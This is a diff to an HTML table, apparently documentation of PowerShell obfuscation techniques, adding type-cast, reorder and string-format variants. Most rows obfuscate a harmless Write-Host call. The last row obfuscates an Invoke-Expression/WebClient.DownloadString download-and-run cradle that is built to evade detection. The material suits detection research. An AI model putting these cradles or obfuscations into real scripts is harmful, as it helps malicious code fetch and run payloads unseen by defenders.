@@ -145,23 +145,35 @@ you can copy the results from all cases for one or more obfuscation methods and 
  </tr> 
  <tr>
   <td align="center">7</td>
-  <td align="center"></td>
+  <td align="center">TOKEN\TYPE\1</td>
   <td nowrap> 
-   <p></p>
-   <p></p>
-   <p></p>
-   <p></p>
+   <p>  Set-ItEM  VaRIABLe:Lcx (  [TyPE]('SC'+'rIP'+'TB'+'LOck') );  (vARIABlE  lCx ).vALUE::Create("Write-Host $env:path")</p>
+   <p> sV  ("5Y"+"X")  (  [typE]('SCrIpTBLo'+'C'+'k'))  ;    ( iTEm  ('vaR'+'iabL'+'e:5'+'yx') ).VALue::Create("Write-Host $env:path")</p>
+   <p>  SET  F9cg  (  [tYpE]('scr'+'I'+'PTBLo'+'Ck') ) ;   ( gCI  vaRiABLe:F9CG ).vALuE::Create("Write-Host $env:path")</p>
+   <p> SET-Variable  ('V'+'IR') ([TyPE]('SC'+'rI'+'PtBlo'+'CK')  )  ;  $VIr::Create("Write-Host $env:path")</p>
   </td>
-  <td align="left"></td>
+  <td align="left">This option applies Type Cast + Concatenate</td>
  </tr> 
  <tr>
-  <td align="center"></td>
-  <td align="center"></td>
+  <td align="center">8</td>
+  <td align="center">TOKEN\TYPE\2</td>
   <td nowrap> 
-   <p></p>
-   <p></p>
-   <p></p>
-   <p></p>
+   <p>Set-itEM  vaRiAbLE:YsB  (  [tYPe]("{1}{3}{0}{2}"-f'C','SCrIP','K','tblO') ) ;   (  GET-vArIAblE  YSb  ).vAlUE::Create("Write-Host $env:path")</p>
+   <p> set-ITEm ('VAri'+'aBL'+'E'+':Y'+'7w8o') ([typE]("{2}{0}{3}{1}"-f'c','LoCK','s','RIPTb')  ) ; ( geT-ChILditEM ('VARI'+'aBL'+'e'+':y'+'7w8O') ).vALue::Create("Write-Host $env:path")</p>
+   <p>SEt-ItEM  ('vAriAb'+'l'+'e:p87z2')  ([TyPe]("{2}{0}{1}"-F 'tBl','OCK','ScriP') ) ; (  ItEM ('VaRiab'+'L'+'E:P87Z2')).vaLUe::Create("Write-Host $env:path")</p>
+   <p>  $094 =  [tyPE]("{1}{0}{3}{2}"-F'C','s','TbLoCK','riP')  ;   $094::Create("Write-Host $env:path")</p>
+  </td>
+  <td align="left">This option applies Type Cast + Reorder</td>
+ </tr> 
+ <tr>
+  <td align="center">9</td>
+  <td align="center">TOKEN\ALL\1</td>
+  <td nowrap> 
+   <p>.("{0}{3}{1}{2}{4}{5}" -f 'Inv','Expre','s','oke-','si','on') (                      .("{2}{1}{0}" -f'ct','je','New-Ob') ("{2}{0}{1}"-f 'e','bClient','Net.W')               ).("{2}{0}{1}{3}" -f 'ownl','oad','D','String')</p>
+   <p>.("{1}{0}{4}{3}{2}" -f'e-E','Invok','on','ressi','xp') (.("{1}{2}{0}" -f 'Object','New','-') ("{1}{2}{0}{3}"-f 'en','Net.WebC','li','t')).("{0}{3}{2}{4}{1}" -f'Do','ing','l','wn','oadStr')</p>
+   <p>&("{0}{1}{3}{2}"-f'I','nvoke','ession','-Expr') (&("{1}{0}{2}"-f'Obj','New-','ect') ("{2}{0}{4}{1}{3}" -f 'Cl','en','Net.Web','t','i')).("{1}{2}{3}{0}" -f'g','DownloadSt','r','in')</p>
+   <p>&("{3}{4}{1}{0}{2}" -f'si','pres','on','Invoke-','Ex') (.("{1}{2}{0}"-f't','N','ew-Objec') ("{1}{2}{0}"-f 't','Ne','t.WebClien')).("{1}{2}{3}{0}" -f'g','Down','load','Strin')</p>
+   <p>.("{3}{2}{0}{1}"-f 're','ssion','-Exp','Invoke') (.("{2}{0}{3}{1}" -f'-Ob','t','New','jec') ("{2}{1}{3}{4}{0}"-f'Client','t.','Ne','We','b')).("{0}{2}{3}{1}" -f 'Dow','String','nl','oad')</p>
   </td>
   <td align="left"></td>
  </tr>
